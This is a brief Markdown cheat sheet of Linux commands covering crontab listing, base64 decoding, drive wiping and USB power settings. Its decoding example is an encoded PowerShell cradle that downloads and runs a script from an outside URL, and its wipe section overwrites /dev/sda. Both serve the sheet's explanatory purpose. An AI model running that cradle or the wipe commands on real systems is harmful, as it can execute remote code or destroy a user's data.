# crontab

## List crontab jobs for current user
```crontab -l```

## List crontab jobs for another user
```crontab -l -u anotheruser```

## List crontab jobs for all users
```for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l; done```

## Convert base64 to single-byte unicode
```echo "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBzAHEAdQBpAHIAcgBlAGwAZABpAHIAZQBjAHQAbwByAHkALgBjAG8AbQAvAGEAJwApAAoA" | base64 -d | iconv -f UTF-16LE -t UTF-8```

# Securely wipe a drive
```
dd if=/dev/urandom of=/dev/sda status=progress
dd if=/dev/zero of=/dev/sda status=progress
dd if=/dev/urandom of=/dev/sda status=progress
```

## Disable USB suspension
Some devices, like a wireless mouse USB dongle, may go into suspension mode and never return, requiring reinserting the dongle. This fixes that.
```
echo on | sudo tee /sys/bus/usb/devices/*/power/level >/dev/null
```
